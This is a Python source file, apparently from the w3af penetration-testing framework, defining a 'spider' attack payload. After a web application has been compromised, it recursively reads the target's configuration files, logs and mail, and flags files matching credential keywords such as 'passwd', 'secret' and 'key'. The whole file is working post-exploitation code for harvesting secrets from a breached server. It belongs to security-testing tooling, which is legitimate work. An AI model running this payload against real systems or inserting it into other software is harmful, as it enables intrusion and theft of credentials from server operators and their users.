import re

from w3af.core.data.constants.common_directories import get_common_directories
from w3af.core.ui.console.tables import table

from w3af.plugins.attack.payloads.base_payload import Payload


class spider(Payload):
    """
    This payload crawls the remote file system and extracts information.

    The recursion_level is an integer (2 or 3 is recommended but any number can
    be used) that specifies the depth used in the spidering process. The higher
    the recursion_level, the more time it takes to complete the spider process.

    Usage: spider <recursion_level>
    """
    def api_read(self, recursion_level):

        def extract_files_from_payloads():
            """
            :return: A list of files that's mentioned in the other payloads
            I use this as a start point.
            """
            payload_result = self.exec_payload('apache_config_files')
            payload_files = payload_result['apache_config'].keys()

            key_payloads = ['dhcp_config_files', 'dns_config_files',
                            'dns_config_files', 'ftp_config_files',
                            'kerberos_config_files', 'kerberos_config_files',
                            'ldap_config_files', 'mail_config_files',
                            'mysql_config', 'users_config_files',
                            'read_mail', 'log_reader', 'interesting_files']

            for keyed_payload in key_payloads:
                payload_result = self.exec_payload(keyed_payload)
                if isinstance(payload_result, dict):
                    payload_files.extend(payload_result.keys())

            #    This increases the run time of this plugin a lot!
            """
            pid_info = self.exec_payload('list_processes')
            for pid in pid_info:
                filename = pid_info[pid]['cmd'].split(' ')[0]
                payload_files.append( filename )
            """

            return payload_files

        def extract_files_from_file(filename, file_content):
            """
            :param filename: The filename to request to the remote end and parse
            :param file_content: The content of the file to analyze
            :return: A list of files referenced in "filename"
            """
            # Compile
            regular_expressions = []
            for common_dirs in get_common_directories():
                regex_string = '(' + common_dirs + \
                    '.*?)[:| |\0|\'|"|<|\n|\r|\t]'
                regex = re.compile(regex_string, re.IGNORECASE)
                regular_expressions.append(regex)

            # And use
            result = []
            for regex in regular_expressions:
                result.extend(regex.findall(file_content))

            # uniq
            result = list(set(result))

            return result

        def is_interesting_file(filename, file_content):
            """
            :return: True if the file seems interesting
            """
            keyword_list = ['passwords', 'passwd', 'password', 'access', 'auth',
                            'authentication', 'authenticate', 'secret', 'key',
                            'keys', 'permissions', 'perm']

            for key in keyword_list:
                if key in filename or key in file_content:
                    return True
            else:
                return False

        try:
            recursion_level = int(recursion_level)
        except:
            ValueError('recursion_level needs to be an integer.')

        self.result = {}

        initial_file_list = extract_files_from_payloads()

        while recursion_level > 0:

            new_files = []

            initial_file_list = [
                f for f in initial_file_list if f not in self.result]

            for filename, file_content in self.read_multi(initial_file_list):

                if file_content:
                    #    Save it in the result
                    self.result[filename] = is_interesting_file(
                        filename, file_content)

                    #    Extract info from it
                    new_files.extend(
                        extract_files_from_file(filename, file_content))

            #
            #    Finish one pass, lets setup the next one
            #
            recursion_level -= 1
            initial_file_list = new_files

        return self.result

    def run_read(self, recursion_level):

        api_result = self.api_read(recursion_level)

        if not api_result:
            return 'No files found.'
        else:
            rows = [['Filename', 'Interesting'], []]
            for filename in api_result:
                interesting = api_result[filename] and 'X' or ''
                rows.append([filename, interesting])

            result_table = table(rows)
            result_table.draw(80)
            return rows
